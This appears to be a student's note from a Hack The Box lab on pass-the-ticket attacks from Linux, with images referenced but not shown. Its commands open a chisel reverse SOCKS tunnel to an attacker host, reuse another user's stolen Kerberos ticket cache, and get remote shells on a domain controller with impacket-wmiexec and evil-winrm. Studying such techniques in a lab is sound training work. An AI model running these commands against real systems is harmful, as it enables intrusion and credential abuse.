#### Installing Kerberos Authentication Package
```shell-session
sudo apt-get install krb5-user -y
```
```shell-session
cat /etc/krb5.conf
```


https://github.com/jpillora/chisel
https://github.com/haad/proxychains
![[Pasted image 20240916115034.png]]


![[Pasted image 20240916115110.png]]
```shell-session
cat /etc/hosts
```

![[Pasted image 20240916115250.png]]
```shell-session
cat /etc/proxychains.conf
```


![[Pasted image 20240916115339.png]]
```cmd-session
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

![[Pasted image 20240916115554.png]]
```shell-session
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I13
```

![[Pasted image 20240916115601.png]]
```shell-session
proxychains impacket-wmiexec dc01 -k
```

```shell-session
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
